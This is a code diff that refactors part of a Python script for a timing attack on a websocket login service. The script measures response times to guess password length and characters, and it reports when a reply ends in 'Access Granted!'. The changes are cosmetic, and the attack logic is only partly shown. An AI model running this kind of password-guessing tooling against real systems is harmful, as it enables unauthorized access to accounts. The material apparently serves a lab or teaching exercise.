@@ -17,7 +17,11 @@ This script is designed to be run as a standalone program, with the main entry p
 Note: This script is intended for educational purposes only. Do not use it for illegal activities.
 """
 
-import socket, sys, asyncio, websockets, json, time, string, operator, statistics
+import sys
+import asyncio
+import websockets
+import json
+import time
 import os
 import statistics
 import string
@@ -54,8 +58,9 @@ async def client_stub(username, password, ip):
                 print(err_count)
                 err_count=0
             return json.loads(reply), time_delta
-        except:
-            err_count+=1
+        except (websockets.exceptions.ConnectionClosed, OSError) as e:
+            err_count += 1
+            print(f"Caught exception: {e}")
             continue
 
 
@@ -76,15 +81,15 @@ def call_server(username, password,ip):
         reply -- string of server's response to login attempt
         (time_after-time_before) -- int of response time for attempt
     """
-    
+
     reply, time_delta = asyncio.get_event_loop().\
             run_until_complete(client_stub(username,password,ip))
     #save_output_to_txt(reply+str(time_delta)+ enter)
-    
+
     if reply[-15:] == 'Access Granted!':
         print('Correct password found: {}'.format(password))
     time.sleep(0.001) # Make sure to wait so as to not overload the server!
-    
+
     return reply, time_delta
 
 
@@ -98,7 +103,7 @@ def print_stats(response_times):
         response_times -- list of reponse times, sorted
             fastest to slowest
     """
-    
+
     slowest = response_times[-1]
     sec_slowest = response_times[-2]
     min_diff = slowest - sec_slowest
@@ -107,7 +112,7 @@ def print_stats(response_times):
     avg_diff_w_max = slowest - avg_time
     st_dev = statistics.stdev(response_times[:-1])
     st_dev_delay = statistics.stdev(response_times)
-      
+
     print(f'Slowest response time: {round(slowest, 4)}')
     print(f'Difference with second-slowest: {round(min_diff, 4)}')
     print(f'Difference with fastest: {round(max_diff, 4)}')
@@ -145,12 +150,21 @@ def length_password(username, passwordlength,ip):
         call_server("","",ip)
         resultaat += "o"
         for x in range(200):
-            
+
             if len(resultaat) > 0:
                 reply,time_delta =call_server(username, resultaat,ip)
 
-                save_output_to_txt('Sending login attempt for username: {} and password: {}'.format(username, resultaat)+ (" "*(passwordlength- len(resultaat)))+ ' response time = '+str(time_delta)+ '\n')
-                #print finding password length but keep it on the same line
+
+                output_message = (
+                    'Sending login attempt for username: {} and password: {}'
+                    .format(username, resultaat)
+                    + (" " * (passwordlength - len(resultaat)))
+                    + ' response time = '
+                    + str(time_delta)
+                    + '\n'
+                )
+                save_output_to_txt(output_message)
+                                #print finding password length but keep it on the same line
                 print('Finding password length: {}'.format(len(resultaat)), end='\r')
 
 
@@ -226,7 +240,7 @@ def main():
     passwordlength = int(input("Input max length of password: "))
     clear_terminal()
     length_password(username, passwordlength,ip)
-    
+
 
     real_length_of_password = find_real_password_length(passwordlength)
     print(real_length_of_password)
@@ -235,6 +249,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
-
-
